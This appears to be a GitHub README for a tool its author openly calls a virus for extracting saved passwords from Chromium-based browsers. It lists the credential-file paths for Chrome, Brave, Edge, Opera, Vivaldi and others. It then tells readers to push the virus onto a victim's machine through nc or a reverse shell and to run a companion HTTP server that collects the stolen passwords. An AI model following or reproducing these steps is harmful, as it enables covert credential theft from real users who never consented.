# BrowserPasswordExtractor
Virus for extracting saved passwords from chromium based browsers 

## Usage

1. Make sure to use correct version of the virus (brave or chrome, latest release is modular witch means that it can be used on both browsers so just ignore this and skip to downloading) and download it from [this](https://github.com/Josakko/BrowserPasswordExtractor/releases/tag/v2) link 
2. Replace data from `todo.txt` file whit correct one and also for line 4 and 5 make sure to use one of following strings or make your own:
#### Chromium

    AppData\Local\Chromium\User Data\Local State
    AppData\Local\Chromium\User Data\Default\Login Data

#### Chrome

    AppData/Local/Google/Chrome/User Data/Local State
    AppData/Local/Google/Chrome/User Data/Default/Login Data 

#### Brave 

    AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State
    AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data

#### Edge

    AppData/Local/Microsoft/Edge/User Data/Local State
    AppData/Local/Microsoft/Edge/User Data/Default/Login Data

#### Opera

    AppData/Roaming/Opera Software/Opera Stable/Local State
    AppData/Roaming/Opera Software/Opera Stable/Login Data

#### Opera GX

    AppData\Roaming\Opera Software\Opera GX Stable\Local State
    AppData\Roaming\Opera Software\Opera GX Stable\Login Data

#### Vivaldi

    AppData/Local/Vivaldi/User Data/Local State
    AppData/Local/Vivaldi/User Data/Default/Login Data

3. Use nc or some other reversed shell to upload the virus to the victims machine
4. Download http server from my key loegger repo (now the server is on its own repo) witch you can find [here](https://github.com/Josakko/HttpServer)
5. Make sure that server is running while virus is to retrive all passwords from victims maching and also dont forget to replace data from `todo.txt` whit correct one

## Need Help?
If you need help contact me on my [discord server](https://discord.gg/xgET5epJE6).

## Contributors
Big thanks to all of the amazing people (only me) who have helped by contributing to this project!
